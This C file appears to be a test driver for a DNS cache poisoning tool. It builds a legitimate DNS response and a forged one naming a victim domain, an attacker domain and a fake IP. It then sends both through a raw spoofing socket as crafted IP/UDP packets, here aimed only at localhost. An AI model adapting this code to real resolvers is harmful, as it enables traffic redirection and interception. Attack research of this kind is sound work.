#include "fake.h"
#include "util.h"
#include "network.h"
#include "dns.h"
#include <time.h>
#include <stdlib.h>
#include <stdio.h>


int main(int argc, char **argv)
{
    // 1. Initialize
    srand(time(NULL));
    dns_init();
    Arena arena = {0};
    // 2. Set test parameters
    char *src_ip = "127.0.0.1";
    char *target_ip = "127.0.0.1";
    uint16_t target_port = 12345;

    // Parameters needed by _build_std_resp function
    char *qname = "www.example.com";
    char *prefix = "c";
    char *victim = "example.com";
    char *attacker = "a.com";
    char *origin_ip = "1.1.1.1"; // Use a standard test IP address
    char *fake_ip = "9.9.9.9";
    size_t chain_length = 55;       // Set a shorter CNAME chain length for testing

    printf("[*] Starting test for _build_std_resp function...\n");
    printf("[*] Target address: %s:%u\n", target_ip, target_port);

    // 3. Create raw socket for sending IP packets
    int sockfd = make_sockfd_for_spoof();
    if (sockfd < 0)
    {
        perror("[-] Failed to create socket");
        return 1;
    }
    printf("[+] Raw socket created successfully.\n");

    // 4. Build DNS response payload using the function under test
    uint8_t *dns_payload = (uint8_t *)alloc_memory(LARGE_PKT_MAX_LEN);
    uint8_t *std_dns_payload = (uint8_t *)alloc_memory(LARGE_PKT_MAX_LEN);
    printf("[*] Calling _build_std_resp to build DNS response payload...\n");


    size_t std_dns_payload_len = _build_std_resp(&arena,
        std_dns_payload, LARGE_PKT_MAX_LEN, qname, prefix, victim, origin_ip, chain_length);
    
    size_t dns_payload_len = build_fake_resp(
        &arena,
        dns_payload,
        LARGE_PKT_MAX_LEN,
        qname,
        prefix,
        victim,
        origin_ip,
        attacker,
        fake_ip,
        chain_length
    );

    if (dns_payload_len == (size_t)-1 || dns_payload_len == 0)
    {
        fprintf(stderr, "[-] build_resp failed to create DNS payload.\n");
        free(dns_payload);
        close(sockfd);
        return 1;
    }
    printf("[+] DNS payload created successfully, size: %zu bytes.\n", dns_payload_len);

    // _build_std_resp hardcodes TXID to 0, we set a random value here for more realistic testing
    struct dnshdr *dnsh = (struct dnshdr *)dns_payload;
    dnsh->id = htons((uint16_t)(rand() % 65536));
    printf("[*] Set random DNS transaction ID (TXID): %u\n", ntohs(dnsh->id));

    // 5. Encapsulate DNS payload into a complete IP/UDP packet
    // Calculate total packet length
    size_t packet_raw_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_payload_len;
    size_t std_packet_raw_len = sizeof(struct iphdr) + sizeof(struct udphdr) + std_dns_payload_len;
    uint8_t *packet_raw = (uint8_t *)alloc_memory(packet_raw_len);
    uint8_t *std_packet_raw = (uint8_t *)alloc_memory(std_packet_raw_len);

    // Use functions from network.c to fill IP and UDP headers
    make_udp_packet(packet_raw, packet_raw_len,
                    inet_addr(src_ip), inet_addr(target_ip),
                    53, // DNS response source port is typically 53
                    target_port,
                    dns_payload, dns_payload_len);
    make_udp_packet(std_packet_raw, std_packet_raw_len,
                    inet_addr(src_ip), inet_addr(target_ip),
                    53, // DNS response source port is typically 53
                    target_port,
                    std_dns_payload, std_dns_payload_len);
    printf("[+] Raw IP/UDP packet template created.\n");

    // 6. Send packets
    printf("[*] Sending packet to %s:%u...\n", target_ip, target_port);
    // send_udp_packet(sockfd, packet_raw, packet_raw_len,
    //                 inet_addr(src_ip), inet_addr(target_ip),
    //                 53, target_port);
    struct sendres pos = {NULL, 0};
    pos.positions = (int*)alloc_memory(MAX_FRAGMENTS * sizeof(int));
    pos.positions[pos.count++] = 0;
    send_sltd_udp_packet(&arena, sockfd, std_packet_raw, std_packet_raw_len,
                         inet_addr(src_ip), inet_addr(target_ip),
                         53, target_port, &pos);
    pos.positions[pos.count - 1] = 1;
    send_sltd_udp_packet(&arena, sockfd, packet_raw, packet_raw_len,
                    inet_addr(src_ip), inet_addr(target_ip),
                    53, target_port, &pos);
    
    printf("[+] Packet sent.\n");

    // 7. Clean up resources
    free(pos.positions);
    free(dns_payload);
    free(std_dns_payload);
    free(packet_raw);
    free(std_packet_raw);
    close(sockfd);

    printf("[*] Test finished.\n");
    return 0;
}